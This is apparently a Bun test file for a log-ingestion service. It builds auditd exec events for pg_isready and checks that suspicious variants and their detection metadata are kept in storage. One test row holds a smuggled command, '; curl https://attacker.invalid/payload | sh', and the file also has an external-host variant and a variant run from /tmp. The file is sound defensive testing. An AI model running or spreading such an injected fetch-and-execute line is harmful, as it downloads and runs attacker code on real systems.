import { expect, mock, test } from 'bun:test'
import { createHash } from 'node:crypto'
import { eligibleCollectorExecution } from '../src/utils/mill/analyzeCollector.ts'

mock.module('#constants', () => ({ default: {} }))
mock.module('#db', () => ({ default: async () => { throw new Error('Unexpected database access') },
    withTransaction: async () => { throw new Error('Expected caller transaction') } }))
const { recordLogBatch } = await import('../src/utils/logs/recordLog.ts')

const argv = ['/usr/lib/postgresql/15/bin/pg_isready', '-U', 'hanasand', '-d', 'hanasand']
let auditId = 42
function audit(args = argv, success = 'yes') {
    const id = String(auditId++)
    const command = args.map(value => /^[\w@%+=:,./-]+$/.test(value) ? value : `'${value.replaceAll("'", "'\"'\"'")}'`).join(' ')
    // Equivalent to the collector's parsed audit event, kept within the API
    // build context so the production image can run this ingestion regression.
    return { host: 'inspur', service: 'audit', level: 'info', message: command, timestamp: '2026-09-23T20:00:00.010Z',
        sourceEventId: createHash('sha256').update(`inspur:audit:msg=audit(1790193600.010:${id})`).digest('hex'),
        metadata: { collector: 'auditd', event_type: 'process', action: 'exec', outcome: success === 'yes' ? 'success' : 'failure', audit_id: id,
            process: { executable: args[0], command_line: command, arguments: args, pid: '12345', parent_pid: '12000' },
            user: { id: '0', login_id: '4294967295' } } as Record<string, any> }
}

test('successful readiness exec is not command-completion proof', () => {
    const log = audit()
    expect(log.metadata.outcome).toBe('success')
    expect(log.metadata.collector_execution).toBeUndefined()
    expect(eligibleCollectorExecution(log)).toBe(false)
    // Even a collector-shaped receipt must not expand its command allowlist.
    log.metadata.collector_execution = { unit: 'hanasand-log-collector.service',
        boot_id: '3e735e7b-4d7f-444d-9806-231fa26cfcec', pid: '12345', parent_pid: '12000',
        started_at: 1790193600000, finished_at: 1790193600100, executable: argv[0],
        arguments: argv, exit_code: 0, stderr_empty: true }
    expect(eligibleCollectorExecution(log)).toBe(false)
})

test('ingestion retains readiness audit evidence and suspicious variants with builtins enabled', async () => {
    const rows = [audit(), audit(argv, 'no'), audit([...argv, '-h', '203.0.113.20']),
        audit([argv[0], '-U', 'attacker', '-d', 'hanasand']), audit(['/tmp/pg_isready', ...argv.slice(1)]),
        audit([...argv, '; curl https://attacker.invalid/payload | sh'])]
    const detection = audit()
    detection.metadata.detections = [{ severity: 'critical', summary: 'Unexpected readiness execution' }]
    rows.push(detection)
    const tenant = audit(); tenant.metadata.organizationId = 'customer'; rows.push(tenant)
    const writes: string[] = []
    let stored: unknown[][] = []
    const query: any = async (sql: string, params: any[] = []) => {
        if (sql.includes("r.source='owned'")) return { rows: [] }
        if (sql.includes('FROM mill_rules')) return { rows: [{ organization_id: 'platform', version: '1', enabled: true,
            definition: { stage: 'analyze', action: 'drop', parameters: {} } }] }
        if (sql.includes('INSERT INTO service_logs')) { stored = JSON.parse(params[0]); return { rows: [], rowCount: rows.length } }
        writes.push(sql)
        throw new Error(`Unexpected analyzer query: ${sql}`)
    }
    expect(new Set(rows.map(row => row.sourceEventId)).size).toBe(rows.length)
    await recordLogBatch(rows.map(row => ({ ...row, level: 'info' as const })), query)
    expect(stored).toHaveLength(rows.length)
    expect(writes).toEqual([])
    for (const [i, row] of rows.entries()) {
        expect(stored[i][3]).toBe(row.message)
        const metadata = JSON.parse(stored[i][4] as string)
        expect(metadata.process).toEqual(row.metadata.process)
        expect(metadata.user).toEqual(row.metadata.user)
        expect(metadata.outcome).toEqual(row.metadata.outcome)
    }
    expect(JSON.parse(stored[6][4] as string).detections).toEqual(detection.metadata.detections)
})
